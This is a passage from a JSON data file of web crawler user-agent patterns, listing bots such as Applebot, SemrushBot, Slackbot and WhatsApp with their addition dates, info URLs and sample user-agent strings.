      "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider"
    ]
  }
  ,
  {
    "pattern": "psbot",
    "addition_date": "2014/03/31",
    "url": "http://www.picsearch.com/bot.html",
    "instances": [
      "psbot-image (+http://www.picsearch.com/bot.html)",
      "psbot-page (+http://www.picsearch.com/bot.html)",
      "psbot/0.1 (+http://www.picsearch.com/bot.html)"
    ]
  }
  ,
  {
    "pattern": "InterfaxScanBot",
    "addition_date": "2014/03/31",
    "url": "http://scan-interfax.ru",
    "instances": []
  }
  ,
  {
    "pattern": "CC Metadata Scaper",
    "addition_date": "2014/04/01",
    "url": "http://wiki.creativecommons.org/Metadata_Scraper",
    "instances": [
      "CC Metadata Scaper http://wiki.creativecommons.org/Metadata_Scraper"
    ]
  }
  ,
  {
    "pattern": "g00g1e.net",
    "addition_date": "2014/04/01",
    "url": "http://www.g00g1e.net/",
    "instances": []
  }
  ,
  {
    "pattern": "GrapeshotCrawler",
    "addition_date": "2014/04/01",
    "url": "http://www.grapeshot.co.uk/crawler.php",
    "instances": [
      "Mozilla/5.0 (compatible; GrapeshotCrawler/2.0; +http://www.grapeshot.co.uk/crawler.php)"
    ]
  }
  ,
  {
    "pattern": "urlappendbot",
    "addition_date": "2014/05/10",
    "url": "http://www.profound.net/urlappendbot.html",
    "instances": [
      "Mozilla/5.0 (compatible; URLAppendBot/1.0; +http://www.profound.net/urlappendbot.html)"
    ]
  }
  ,
  {
    "pattern": "brainobot",
    "addition_date": "2014/06/24",
    "instances": []
  }
  ,
  {
    "pattern": "fr-crawler",
    "addition_date": "2014/07/31",
    "instances": [
      "Mozilla/5.0 (compatible; fr-crawler/1.1)"
    ]
  }
  ,
  {
    "pattern": "binlar",
    "addition_date": "2014/09/12",
    "instances": [
      "binlar_2.6.3 binlar2.6.3@unspecified.mail",
      "binlar_2.6.3 binlar_2.6.3@unspecified.mail",
      "binlar_2.6.3 larbin2.6.3@unspecified.mail",
      "binlar_2.6.3 phanendra_kalapala@McAfee.com",
      "binlar_2.6.3 test@mgmt.mic"
    ]
  }
  ,
  {
    "pattern": "SimpleCrawler",
    "addition_date": "2014/09/12",
    "instances": [
      "SimpleCrawler/0.1"
    ]
  }
  ,
  {
    "pattern": "Twitterbot",
    "addition_date": "2014/09/12",
    "url": "https://dev.twitter.com/cards/getting-started",
    "instances": [
      "Twitterbot/0.1",
      "Twitterbot/1.0"
    ]
  }
  ,
  {
    "pattern": "cXensebot",
    "addition_date": "2014/10/05",
    "instances": [
      "cXensebot/1.1a"
    ],
    "url": "http://www.cxense.com/bot.html"
  }
  ,
  {
    "pattern": "smtbot",
    "addition_date": "2014/10/04",
    "instances": [
      "Mozilla/5.0 (compatible; SMTBot/1.0; +http://www.similartech.com/smtbot)",
      "SMTBot (similartech.com/smtbot)",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko)                 Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; SMTBot/1.0; +http://www.similartech.com/smtbot)",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.75 Safari/537.36 (compatible; SMTBot/1.0; +http://www.similartech.com/smtbot)",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.75 Safari/537.36 (compatible; SMTBot/1.0; http://www.similartech.com/smtbot)"
    ],
    "url": "http://www.similartech.com/smtbot"
  }
  ,
  {
    "pattern": "bnf.fr_bot",
    "addition_date": "2014/11/18",
    "url": "http://www.bnf.fr/fr/outils/a.dl_web_capture_robot.html",
    "instances": [
      "Mozilla/5.0 (compatible; bnf.fr_bot; +http://bibnum.bnf.fr/robot/bnf.html)",
      "Mozilla/5.0 (compatible; bnf.fr_bot; +http://www.bnf.fr/fr/outils/a.dl_web_capture_robot.html)"
    ]
  }
  ,
  {
    "pattern": "A6-Indexer",
    "addition_date": "2014/12/05",
    "url": "http://www.a6corp.com/a6-web-scraping-policy/",
    "instances": [
      "A6-Indexer"
    ]
  }
  ,
  {
    "pattern": "ADmantX",
    "addition_date": "2014/12/05",
    "url": "http://www.admantx.com",
    "instances": [
      "ADmantX Platform Semantic Analyzer - ADmantX Inc. - www.admantx.com - support@admantx.com"
    ]
  }
  ,
  {
    "pattern": "Facebot",
    "url": "https://developers.facebook.com/docs/sharing/best-practices#crawl",
    "addition_date": "2014/12/30",
    "instances": [
      "Facebot/1.0"
    ]
  }
  ,
  {
    "pattern": "OrangeBot\\/",
    "instances": [
      "Mozilla/5.0 (compatible; OrangeBot/2.0; support.orangebot@orange.com"
    ],
    "addition_date": "2015/01/12"
  }
  ,
  {
    "pattern": "memorybot",
    "url": "http://mignify.com/bot.htm",
    "instances": [
      "Mozilla/5.0 (compatible; memorybot/1.21.14 +http://mignify.com/bot.html)"
    ],
    "addition_date": "2015/02/01"
  }
  ,
  {
    "pattern": "AdvBot",
    "url": "http://advbot.net/bot.html",
    "instances": [
      "Mozilla/5.0 (compatible; AdvBot/2.0; +http://advbot.net/bot.html)"
    ],
    "addition_date": "2015/02/01"
  }
  ,
  {
    "pattern": "MegaIndex",
    "url": "https://www.megaindex.ru/?tab=linkAnalyze",
    "instances": [
      "Mozilla/5.0 (compatible; MegaIndex.ru/2.0; +https://www.megaindex.ru/?tab=linkAnalyze)",
      "Mozilla/5.0 (compatible; MegaIndex.ru/2.0; +http://megaindex.com/crawler)"
    ],
    "addition_date": "2015/03/28"
  }
  ,
  {
    "pattern": "SemanticScholarBot",
    "url": "https://www.semanticscholar.org/crawler",
    "instances": [
      "SemanticScholarBot/1.0 (+http://s2.allenai.org/bot.html)",
      "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
    ],
    "addition_date": "2015/03/28"
  }
  ,
  {
    "pattern": "ltx71",
    "url": "http://ltx71.com/",
    "instances": [
      "ltx71 - (http://ltx71.com/)"
    ],
    "addition_date": "2015/04/04"
  }
  ,
  {
    "pattern": "nerdybot",
    "url": "http://nerdybot.com/",
    "instances": [
      "nerdybot"
    ],
    "addition_date": "2015/04/05"
  }
  ,
  {
    "pattern": "xovibot",
    "url": "http://www.xovibot.net/",
    "instances": [
      "Mozilla/5.0 (compatible; XoviBot/2.0; +http://www.xovibot.net/)"
    ],
    "addition_date": "2015/04/05"
  }
  ,
  {
    "pattern": "BUbiNG",
    "url": "http://law.di.unimi.it/BUbiNG.html",
    "instances": [
      "BUbiNG (+http://law.di.unimi.it/BUbiNG.html)"
    ],
    "addition_date": "2015/04/06"
  }
  ,
  {
    "pattern": "Qwantify",
    "url": "https://www.qwant.com/",
    "instances": [
      "Mozilla/5.0 (compatible; Qwantify/2.0n; +https://www.qwant.com/)/*",
      "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w",
      "Mozilla/5.0 (compatible; Qwantify/Bleriot/1.1; +https://help.qwant.com/bot)",
      "Mozilla/5.0 (compatible; Qwantify/Bleriot/1.2.1; +https://help.qwant.com/bot)"
    ],
    "addition_date": "2015/04/06"
  }
  ,
  {
    "pattern": "archive.org_bot",
    "url": "http://www.archive.org/details/archive.org_bot",
    "depends_on": ["heritrix"],
    "instances": [
      "Mozilla/5.0 (compatible; heritrix/3.1.1-SNAPSHOT-20120116.200628 +http://www.archive.org/details/archive.org_bot)",
      "Mozilla/5.0 (compatible; archive.org_bot/heritrix-1.15.4 +http://www.archive.org)",
      "Mozilla/5.0 (compatible; heritrix/3.3.0-SNAPSHOT-20140702-2247 +http://archive.org/details/archive.org_bot)",
      "Mozilla/5.0 (compatible; archive.org_bot +http://www.archive.org/details/archive.org_bot)",
      "Mozilla/5.0 (compatible; archive.org_bot +http://archive.org/details/archive.org_bot)",
      "Mozilla/5.0 (compatible; special_archiver/3.1.1 +http://www.archive.org/details/archive.org_bot)"
    ],
    "addition_date": "2015/04/14"
  }
  ,
  {
    "pattern": "Applebot",
    "url": "http://www.apple.com/go/applebot",
    "addition_date": "2015/04/15",
    "instances": [
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1)",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)",
      "Mozilla/5.0 (compatible; Applebot/0.3; +http://www.apple.com/go/applebot)",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Applebot/0.3; +http://www.apple.com/go/applebot)",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B410 Safari/600.1.4 (Applebot/0.1; +http://www.apple.com/go/applebot)"
    ]
  }
  ,
  {
    "pattern": "TweetmemeBot",
    "url": "http://datasift.com/bot.html",
    "instances": [
      "Mozilla/5.0 (TweetmemeBot/4.0; +http://datasift.com/bot.html) Gecko/20100101 Firefox/31.0"
    ],
    "addition_date": "2015/04/15"
  }
  ,
  {
    "pattern": "crawler4j",
    "url": "https://github.com/yasserg/crawler4j",
    "instances": [
      "crawler4j (http://code.google.com/p/crawler4j/)",
      "crawler4j (https://github.com/yasserg/crawler4j/)"
    ],
    "addition_date": "2015/05/07"
  }
  ,
  {
    "pattern": "findxbot",
    "url": "http://www.findxbot.com",
    "instances": [
      "Mozilla/5.0 (compatible; Findxbot/1.0; +http://www.findxbot.com)"
    ],
    "addition_date": "2015/05/07"
  }
  ,
  {
    "pattern": "S[eE][mM]rushBot",
    "url": "http://www.semrush.com/bot.html",
    "instances": [
      "Mozilla/5.0 (compatible; SemrushBot-SA/0.97; +http://www.semrush.com/bot.html)",
      "Mozilla/5.0 (compatible; SemrushBot-SI/0.97; +http://www.semrush.com/bot.html)",
      "Mozilla/5.0 (compatible; SemrushBot/3~bl; +http://www.semrush.com/bot.html)",
      "Mozilla/5.0 (compatible; SemrushBot/0.98~bl; +http://www.semrush.com/bot.html)",
      "Mozilla/5.0 (compatible; SemrushBot-BA; +http://www.semrush.com/bot.html)",
      "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)",
      "SEMrushBot"
    ],
    "addition_date": "2015/05/26"
  }
  ,
  {
    "pattern": "yoozBot",
    "url": "http://yooz.ir",
    "instances": [
      "Mozilla/5.0 (compatible; yoozBot-2.2; http://yooz.ir; info@yooz.ir)"
    ],
    "addition_date": "2015/05/26"
  }
  ,
  {
    "pattern": "lipperhey",
    "url": "http://www.lipperhey.com/",
    "instances": [
      "Mozilla/5.0 (compatible; Lipperhey Link Explorer; http://www.lipperhey.com/)",
      "Mozilla/5.0 (compatible; Lipperhey SEO Service; http://www.lipperhey.com/)",
      "Mozilla/5.0 (compatible; Lipperhey Site Explorer; http://www.lipperhey.com/)",
      "Mozilla/5.0 (compatible; Lipperhey-Kaus-Australis/5.0; +https://www.lipperhey.com/en/about/)"
    ],
    "addition_date": "2015/08/26"
  }
  ,
  {
    "pattern": "Y!J",
    "url": "https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/~/%E3%82%A6%E3%82%A7%E3%83%96%E3%83%9A%E3%83%BC%E3%82%B8%E3%81%AB%E3%82%A2%E3%82%AF%E3%82%BB%E3%82%B9%E3%81%99%E3%82%8B%E3%82%B7%E3%82%B9%E3%83%86%E3%83%A0%E3%81%AE%E3%83%A6%E3%83%BC%E3%82%B6%E3%83%BC%E3%82%A8%E3%83%BC%E3%82%B8%E3%82%A7%E3%83%B3%E3%83%88%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6",
    "instances": [
      "Y!J-ASR/0.1 crawler (http://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)",
      "Y!J-BRJ/YATS crawler (http://help.yahoo.co.jp/help/jp/search/indexing/indexing-15.html)",
      "Y!J-PSC/1.0 crawler (http://help.yahoo.co.jp/help/jp/search/indexing/indexing-15.html)",
      "Y!J-BRW/1.0 crawler (http://help.yahoo.co.jp/help/jp/search/indexing/indexing-15.html)",
      "Mozilla/5.0 (iPhone; Y!J-BRY/YATSH crawler; http://help.yahoo.co.jp/help/jp/search/indexing/indexing-15.html)",
      "Mozilla/5.0 (compatible; Y!J SearchMonkey/1.0 (Y!J-AGENT; http://help.yahoo.co.jp/help/jp/search/indexing/indexing-15.html))"
    ],
    "addition_date": "2015/05/26"
  }
  ,
  {
    "pattern": "Domain Re-Animator Bot",
    "url": "http://domainreanimator.com",
    "instances": [
      "Domain Re-Animator Bot (http://domainreanimator.com) - support@domainreanimator.com"
    ],
    "addition_date": "2015/04/14"
  }
  ,
  {
    "pattern": "AddThis",
    "url": "https://www.addthis.com",
    "instances": [
      "AddThis.com robot tech.support@clearspring.com"
    ],
    "addition_date": "2015/06/02"
  }
  ,
  {
    "pattern": "Screaming Frog SEO Spider",
    "url": "http://www.screamingfrog.co.uk/seo-spider",
    "instances": [
      "Screaming Frog SEO Spider/5.1"
    ],
    "addition_date": "2016/01/08"
  }
  ,
  {
    "pattern": "MetaURI",
    "url": "http://www.useragentstring.com/MetaURI_id_17683.php",
    "instances": [
      "MetaURI API/2.0 +metauri.com"
    ],
    "addition_date": "2016/01/02"
  }
  ,
  {
    "pattern": "Scrapy",
    "url": "http://scrapy.org/",
    "instances": [
      "Scrapy/1.0.3 (+http://scrapy.org)"
    ],
    "addition_date": "2016/01/02"
  }
  ,
  {
    "pattern": "Livelap[bB]ot",
    "url": "http://site.livelap.com/crawler",
    "instances": [
      "LivelapBot/0.2 (http://site.livelap.com/crawler)",
      "Livelapbot/0.1"
    ],
    "addition_date": "2016/01/02"
  }
  ,
  {
    "pattern": "OpenHoseBot",
    "url": "http://www.openhose.org/bot.html",
    "instances": [
      "Mozilla/5.0 (compatible; OpenHoseBot/2.1; +http://www.openhose.org/bot.html)"
    ],
    "addition_date": "2016/01/02"
  }
  ,
  {
    "pattern": "CapsuleChecker",
    "url": "http://www.capsulink.com/about",
    "instances": [
      "CapsuleChecker (http://www.capsulink.com/)"
    ],
    "addition_date": "2016/01/02"
  }
  ,
  {
    "pattern": "collection@infegy.com",
    "url": "http://infegy.com/",
    "instances": [
      "Mozilla/5.0 (compatible) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36 collection@infegy.com"
    ],
    "addition_date": "2016/01/03"
  }
  ,
  {
    "pattern": "IstellaBot",
    "url": "http://www.tiscali.it/",
    "instances": [
      "Mozilla/5.0 (compatible; IstellaBot/1.23.15 +http://www.tiscali.it/)"
    ],
    "addition_date": "2016/01/09"
  }
  ,
  {
    "pattern": "DeuSu\\/",
    "addition_date": "2016/01/23",
    "url": "https://deusu.de/robot.html",
    "instances": [
      "Mozilla/5.0 (compatible; DeuSu/0.1.0; +https://deusu.org)",
      "Mozilla/5.0 (compatible; DeuSu/5.0.2; +https://deusu.de/robot.html)"
    ]
  }
  ,
  {
    "pattern": "betaBot",
    "addition_date": "2016/01/23",
    "instances": []
  }
  ,
  {
    "pattern": "Cliqzbot\\/",
    "addition_date": "2016/01/23",
    "url": "http://cliqz.com/company/cliqzbot",
    "instances": [
      "Mozilla/5.0 (compatible; Cliqzbot/2.0; +http://cliqz.com/company/cliqzbot)",
      "Cliqzbot/0.1 (+http://cliqz.com +cliqzbot@cliqz.com)",
      "Cliqzbot/0.1 (+http://cliqz.com/company/cliqzbot)",
      "Mozilla/5.0 (compatible; Cliqzbot/0.1 +http://cliqz.com/company/cliqzbot)",
      "Mozilla/5.0 (compatible; Cliqzbot/1.0 +http://cliqz.com/company/cliqzbot)"
    ]
  }
  ,
  {
    "pattern": "MojeekBot\\/",
    "addition_date": "2016/01/23",
    "url": "https://www.mojeek.com/bot.html",
    "instances": [
      "MojeekBot/0.2 (archi; http://www.mojeek.com/bot.html)",
      "Mozilla/5.0 (compatible; MojeekBot/0.2; http://www.mojeek.com/bot.html#relaunch)",
      "Mozilla/5.0 (compatible; MojeekBot/0.2; http://www.mojeek.com/bot.html)",
      "Mozilla/5.0 (compatible; MojeekBot/0.5; http://www.mojeek.com/bot.html)",
      "Mozilla/5.0 (compatible; MojeekBot/0.6; +https://www.mojeek.com/bot.html)",
      "Mozilla/5.0 (compatible; MojeekBot/0.6; http://www.mojeek.com/bot.html)"
    ]
  }
  ,
  {
    "pattern": "netEstate NE Crawler",
    "addition_date": "2016/01/23",
    "url": "+http://www.website-datenbank.de/",
    "instances": [
      "netEstate NE Crawler (+http://www.sengine.info/)",
      "netEstate NE Crawler (+http://www.website-datenbank.de/)"
    ]
  }
  ,
  {
    "pattern": "SafeSearch microdata crawler",
    "addition_date": "2016/01/23",
    "url": "https://safesearch.avira.com",
    "instances": [
      "SafeSearch microdata crawler (https://safesearch.avira.com, safesearch-abuse@avira.com)"
    ]
  }
  ,
  {
    "pattern": "Gluten Free Crawler\\/",
    "addition_date": "2016/01/23",
    "url": "http://glutenfreepleasure.com/",
    "instances": [
      "Mozilla/5.0 (compatible; Gluten Free Crawler/1.0; +http://glutenfreepleasure.com/)"
    ]
  }
  ,
  {
    "pattern": "Sonic",
    "addition_date": "2016/02/08",
    "url": "http://www.yama.info.waseda.ac.jp/~crawler/info.html",
    "instances": [
      "Mozilla/5.0 (compatible; RankSonicSiteAuditor/1.0; +https://ranksonic.com/ranksonic_sab.html)",
      "Mozilla/5.0 (compatible; Sonic/1.0; http://www.yama.info.waseda.ac.jp/~crawler/info.html)",
      "Mozzila/5.0 (compatible; Sonic/1.0; http://www.yama.info.waseda.ac.jp/~crawler/info.html)"
    ]
  }
  ,
  {
    "pattern": "Sysomos",
    "addition_date": "2016/02/08",
    "url": "http://www.sysomos.com",
    "instances": [
      "Mozilla/5.0 (compatible; Sysomos/1.0; +http://www.sysomos.com/; Sysomos)"
    ]
  }
  ,
  {
    "pattern": "Trove",
    "addition_date": "2016/02/08",
    "url": "http://www.trove.com",
    "instances": []
  }
  ,
  {
    "pattern": "deadlinkchecker",
    "addition_date": "2016/02/08",
    "url": "http://www.deadlinkchecker.com",
    "instances": [
      "www.deadlinkchecker.com Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36",
      "www.deadlinkchecker.com XMLHTTP/1.0",
      "www.deadlinkchecker.com XMLHTTP/1.0 Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36"
    ]
  }
  ,
  {
    "pattern": "Slack-ImgProxy",
    "addition_date": "2016/04/25",
    "url": "https://api.slack.com/robots",
    "instances": [
      "Slack-ImgProxy (+https://api.slack.com/robots)",
      "Slack-ImgProxy 0.59 (+https://api.slack.com/robots)",
      "Slack-ImgProxy 0.66 (+https://api.slack.com/robots)",
      "Slack-ImgProxy 1.106 (+https://api.slack.com/robots)",
      "Slack-ImgProxy 1.138 (+https://api.slack.com/robots)",
      "Slack-ImgProxy 149 (+https://api.slack.com/robots)"
    ]
  }
  ,
  {
    "pattern": "Embedly",
    "addition_date": "2016/04/25",
    "url": "http://support.embed.ly",
    "instances": [
      "Embedly +support@embed.ly",
      "Mozilla/5.0 (compatible; Embedly/0.2; +http://support.embed.ly/)",
      "Mozilla/5.0 (compatible; Embedly/0.2; snap; +http://support.embed.ly/)"
    ]
  }
  ,
  {
    "pattern": "RankActiveLinkBot",
    "addition_date": "2016/06/20",
    "url": "https://rankactive.com/resources/rankactive-linkbot",
    "instances": [
      "Mozilla/5.0 (compatible; RankActiveLinkBot; +https://rankactive.com/resources/rankactive-linkbot)"
    ]
  }
  ,
  {
    "pattern": "iskanie",
    "addition_date": "2016/09/02",
    "url": "http://www.iskanie.com",
    "instances": [
      "iskanie (+http://www.iskanie.com)"
    ]
  }
  ,
  {
    "pattern": "SafeDNSBot",
    "addition_date": "2016/09/10",
    "url": "https://www.safedns.com/searchbot",
    "instances": [
      "SafeDNSBot (https://www.safedns.com/searchbot)"
    ]
  }
  ,
  {
    "pattern": "SkypeUriPreview",
    "addition_date": "2016/10/10",
    "instances": [
      "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
    ]
  }
  ,
  {
    "pattern": "Veoozbot",
    "addition_date": "2016/11/03",
    "url": "http://www.veooz.com/veoozbot.html",
    "instances": [
      "Mozilla/5.0 (compatible; Veoozbot/1.0; +http://www.veooz.com/veoozbot.html)"
    ]
  }
  ,
  {
    "pattern": "Slackbot",
    "addition_date": "2016/11/03",
    "url": "https://api.slack.com/robots",
    "instances": [
      "Slackbot-LinkExpanding (+https://api.slack.com/robots)",
      "Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)",
      "Slackbot 1.0 (+https://api.slack.com/robots)"
    ]
  }
  ,
  {
    "pattern": "redditbot",
    "addition_date": "2016/11/03",
    "url": "http://www.reddit.com/feedback",
    "instances": [
      "Mozilla/5.0 (compatible; redditbot/1.0; +http://www.reddit.com/feedback)"
    ]
  }
  ,
  {
    "pattern": "datagnionbot",
    "addition_date": "2016/11/03",
    "url": "http://www.datagnion.com/bot.html",
    "instances": [
      "datagnionbot (+http://www.datagnion.com/bot.html)"
    ]
  }
  ,
  {
    "pattern": "Google-Adwords-Instant",
    "addition_date": "2016/11/03",
    "url": "http://www.google.com/adsbot.html",
    "instances": [
      "Google-Adwords-Instant (+http://www.google.com/adsbot.html)"
    ]
  }
  ,
  {
    "pattern": "adbeat_bot",
    "addition_date": "2016/11/04",
    "instances": [
      "Mozilla/5.0 (compatible; adbeat_bot; +support@adbeat.com; support@adbeat.com)",
      "adbeat_bot"
    ]
  }
  ,
  {
    "pattern": "WhatsApp",
    "addition_date": "2016/11/15",
    "url": "https://www.whatsapp.com/",
    "instances": [
      "WhatsApp",
      "WhatsApp/0.3.4479 N",
      "WhatsApp/0.3.4679 N",
      "WhatsApp/0.3.4941 N",
      "WhatsApp/2.12.15/i",
      "WhatsApp/2.12.16/i",
      "WhatsApp/2.12.17/i",
      "WhatsApp/2.12.449 A",
      "WhatsApp/2.12.453 A",
      "WhatsApp/2.12.510 A",
      "WhatsApp/2.12.540 A",
      "WhatsApp/2.12.548 A",
      "WhatsApp/2.12.555 A",
      "WhatsApp/2.12.556 A",
      "WhatsApp/2.16.1/i",
      "WhatsApp/2.16.13 A",
      "WhatsApp/2.16.2/i",
      "WhatsApp/2.16.42 A",
      "WhatsApp/2.16.57 A",
      "WhatsApp/2.19.92 i",
      "WhatsApp/2.19.175 A",
      "WhatsApp/2.19.244 A",
      "WhatsApp/2.19.258 A",
      "WhatsApp/2.19.308 A",
      "WhatsApp/2.19.330 A"
    ]
  }
  ,
  {
    "pattern": "contxbot",
    "addition_date": "2017/02/25",
    "instances": [
      "Mozilla/5.0 (compatible;contxbot/1.0)"
    ]
  }
  ,
  {
    "pattern": "pinterest.com.bot",
    "addition_date": "2017/03/03",
    "instances": [
      "Mozilla/5.0 (compatible; Pinterestbot/1.0; +http://www.pinterest.com/bot.html)",
      "Pinterest/0.2 (+http://www.pinterest.com/bot.html)"
    ],
    "url": "http://www.pinterest.com/bot.html"
  }
  ,
  {
    "pattern": "electricmonk",
    "addition_date": "2017/03/04",
    "instances": [
      "Mozilla/5.0 (compatible; electricmonk/3.2.0 +https://www.duedil.com/our-crawler/)"
    ],
    "url": "https://www.duedil.com/our-crawler/"
  }
  ,
  {
    "pattern": "GarlikCrawler",
    "addition_date": "2017/03/18",
    "instances": [
      "GarlikCrawler/1.2 (http://garlik.com/, crawler@garlik.com)"
    ],
    "url": "http://garlik.com/"
  }
  ,
  {
    "pattern": "BingPreview\\/",
    "addition_date": "2017/04/23",
    "url": "https://www.bing.com/webmaster/help/which-crawlers-does-bing-use-8c184ec0",
    "instances": [
      "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b",
      "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0; BingPreview/1.0b) like Gecko",
      "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0;  WOW64;  Trident/6.0;  BingPreview/1.0b)",
      "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;  WOW64;  Trident/5.0;  BingPreview/1.0b)",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 BingPreview/1.0b"
    ]
  }
  ,
  {
    "pattern": "vebidoobot",
    "addition_date": "2017/05/08",
    "instances": [
      "Mozilla/5.0 (compatible; vebidoobot/1.0; +https://blog.vebidoo.de/vebidoobot/"
    ],
    "url": "https://blog.vebidoo.de/vebidoobot/"
  }
  ,
  {
    "pattern": "FemtosearchBot",
    "addition_date": "2017/05/16",
    "instances": [
      "Mozilla/5.0 (compatible; FemtosearchBot/1.0; http://femtosearch.com)"
    ],
    "url": "http://femtosearch.com"
  }
  ,
  {
    "pattern": "Yahoo Link Preview",
    "addition_date": "2017/06/28",
    "instances": [
      "Mozilla/5.0 (compatible; Yahoo Link Preview; https://help.yahoo.com/kb/mail/yahoo-link-preview-SLN23615.html)"
    ],
    "url": "https://help.yahoo.com/kb/mail/yahoo-link-preview-SLN23615.html"
  }
  ,
  {
    "pattern": "MetaJobBot",
    "addition_date": "2017/08/16",
    "instances": [
      "Mozilla/5.0 (compatible; MetaJobBot; http://www.metajob.de/crawler)"
    ],
    "url": "http://www.metajob.de/the/crawler"
  }
  ,
  {
    "pattern": "DomainStatsBot",
    "addition_date": "2017/08/16",
    "instances": [
      "DomainStatsBot/1.0 (http://domainstats.io/our-bot)"
    ],
    "url": "http://domainstats.io/our-bot"
  }
  ,
  {
    "pattern": "mindUpBot",
    "addition_date": "2017/08/16",
    "instances": [
      "mindUpBot (datenbutler.de)"
    ],
    "url": "http://www.datenbutler.de/"
  }
  ,
  {
    "pattern": "Daum\\/",
    "addition_date": "2017/08/16",
    "instances": [
      "Mozilla/5.0 (compatible; Daum/4.1; +http://cs.daum.net/faq/15/4118.html?faqId=28966)"
    ],
    "url": "http://cs.daum.net/faq/15/4118.html?faqId=28966"
  }
  ,
  {
    "pattern": "Jugendschutzprogramm-Crawler",
    "addition_date": "2017/08/16",
    "instances": [
      "Jugendschutzprogramm-Crawler; Info: http://www.jugendschutzprogramm.de"
    ],
    "url": "http://www.jugendschutzprogramm.de"
  }
  ,
  {
    "pattern": "Xenu Link Sleuth",
    "addition_date": "2017/08/19",
    "instances": [
      "Xenu Link Sleuth/1.3.8"
    ],
    "url": "http://home.snafu.de/tilman/xenulink.html"
  }
  ,
  {
    "pattern": "Pcore-HTTP",
    "addition_date": "2017/08/19",
    "instances": [
      "Pcore-HTTP/v0.40.3",
      "Pcore-HTTP/v0.44.0"
    ],
    "url": "https://bitbucket.org/softvisio/pcore/overview"
  }
  ,
  {
    "pattern": "moatbot",
    "addition_date": "2017/09/16",
    "instances": [
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36 moatbot",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Mobile/12A4345d Safari/600.1.4 moatbot"
    ],
    "url": "https://moat.com"
  }
  ,
  {
    "pattern": "KosmioBot",
    "addition_date": "2017/09/16",
    "instances": [
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36 (compatible; KosmioBot/1.0; +http://kosm.io/bot.html)"
    ],
    "url": "http://kosm.io/bot.html"
  }
  ,
  {
    "pattern": "[pP]ingdom",
    "addition_date": "2017/09/16",
    "instances": [
      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/59.0.3071.109 Chrome/59.0.3071.109 Safari/537.36 PingdomPageSpeed/1.0 (pingbot/2.0; +http://www.pingdom.com/)",
      "Mozilla/5.0 (compatible; pingbot/2.0; +http://www.pingdom.com/)",
      "Pingdom.com_bot_version_1.4_(http://www.pingdom.com/)",
      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/61.0.3163.100 Chrome/61.0.3163.100 Safari/537.36 PingdomPageSpeed/1.0 (pingbot/2.0; +http://www.pingdom.com/)",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) browser/2020.2.1 Chrome/78.0.3904.130 Electron/7.3.2 Safari/537.36 PingdomTMS/2020.2",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) browser/2020.2.5 Chrome/78.0.3904.130 Electron/7.3.15 Safari/537.36 PingdomTMS/2020.2",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) browser/2020.2.0 Chrome/78.0.3904.130 Electron/7.1.7 Safari/537.36 PingdomTMS/2020.2",
